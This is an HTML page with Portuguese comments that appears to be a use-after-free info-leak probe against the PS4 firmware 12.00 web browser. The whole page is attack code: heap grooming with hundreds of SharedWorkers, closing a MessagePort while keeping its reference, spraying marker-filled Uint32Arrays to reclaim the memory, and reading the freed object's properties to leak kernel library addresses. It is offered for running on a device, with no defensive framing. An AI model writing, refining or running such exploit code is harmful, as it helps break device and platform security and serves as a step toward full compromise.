<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 UAF Leak Test</title>
    
</head>
<body>

    <h1>PS4 12.00 Info Leak Probe</h1>
    <h3>Objetivo: Ler endereço da LibKernel via UAF</h3>
    <div id="status">Status: Aguardando...</div>
    <div id="log"></div>
    <br>
    <button onclick="start_leak_test()">INICIAR SONDA DE LEAK</button>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            var line = `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.innerHTML += line;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. ESTRUTURA DE LEAK (FAKE OBJECT)
        // =================================================================
        // Em vez de shellcode, enchemos o objeto com padrões reconhecíveis
        // para ver se conseguimos lê-los de volta.
        function build_leak_spray() {
            var size = 0x400; // Tamanho estável
            var buffer = new Uint32Array(size / 4);

            // Preenchemos com marcadores visuais
            // 0x41414141 = "AAAA"
            // 0x42424242 = "BBBB"
            for (var i = 0; i < buffer.length; i++) {
                if (i % 2 == 0) buffer[i] = 0x41414141;
                else buffer[i] = 0x42424242;
            }
            return buffer;
        }

        // =================================================================
        // 2. ROTINA DE EXECUÇÃO
        // =================================================================
        var workers_stash = [];

        async function start_leak_test() {
            if (!window.SharedWorker) return log("Navegador incompatível.");
            
            var fake_obj = build_leak_spray();
            log("Payload de Leak construído.", "info");

            // FASE 1: GROOMING
            log("Grooming (400 workers)...", "info");
            for(let i=0; i < 400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers_stash.push(w);
                } catch(e){}
            }

            // FASE 2: PRESSÃO
            log("Zona de Pressão (Buscando o 404)...", "warn");
            var p_count = 0;
            var interval = setInterval(() => {
                if (p_count >= 4) {
                    clearInterval(interval);
                    probe_memory(fake_obj); // Inicia a sonda
                    return;
                }
                try {
                    let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
                    w.port.start();
                    workers_stash.push(w);
                    log(`Worker ${401+p_count} alocado.`);
                } catch(e){}
                p_count++;
            }, 150);
        }

        function probe_memory(payload) {
            log("!!! INICIANDO UAF + LEAK !!!", "warn");
            
            // 1. Vítima
            var victim = workers_stash.pop();
            var port = victim.port; // Guardamos a referência da porta

            // 2. FREE
            port.close(); 
            // NÃO anulamos a variável 'port'. Vamos tentar ler dela!

            // 3. RECLAIM (Spray)
            // Tenta colocar nosso objeto 'AAAA/BBBB' no lugar da porta
            var copies = [];
            for(var i=0; i<5000; i++) {
                copies.push(new Uint32Array(payload));
            }

            // 4. A SONDA (LEAK PROBE)
            log("Tentando ler propriedades do objeto morto...", "info");
            
            try {
                // Tenta ler propriedades padrão que podem retornar dados da memória
                // Se o objeto foi substituído, essas leituras vão pegar dados do nosso Spray
                // ou ponteiros adjacentes.
                
                var probe1 = port.onmessage; 
                log("Leitura 1 (onmessage): " + safe_print(probe1));

                var probe2 = port.onmessageerror;
                log("Leitura 2 (onmessageerror): " + safe_print(probe2));

                // Tenta inspecionar o objeto inteiro
                console.log(port); 
                log("Objeto dumpado no console nativo (Pressione Options -> Console).");

            } catch(e) {
                log("Erro de leitura: " + e, "err");
            }

            // TESTE DE "TYPE CONFUSION"
            // Se conseguirmos tratar a porta como outro tipo de objeto
            try {
                // Tenta ler como se fosse um array ou buffer (geralmente falha, mas vale tentar)
                if (port.byteLength) {
                    log("LEAK CRÍTICO: byteLength encontrado: " + port.byteLength, "leak");
                }
            } catch(e) {}

            log("--- FIM DA SONDA ---");
            log("Se você ver 'AAAA' ou números hexadecimais estranhos acima, TIRAR FOTO!");
        }

        function safe_print(val) {
            if (val === null) return "null";
            if (val === undefined) return "undefined";
            if (typeof val === 'object') return "[Object]";
            if (typeof val === 'function') return "[Function]";
            
            // Se for um número ou string, pode ser nosso leak!
            return val.toString();
        }

    </script>
</body>
</html>
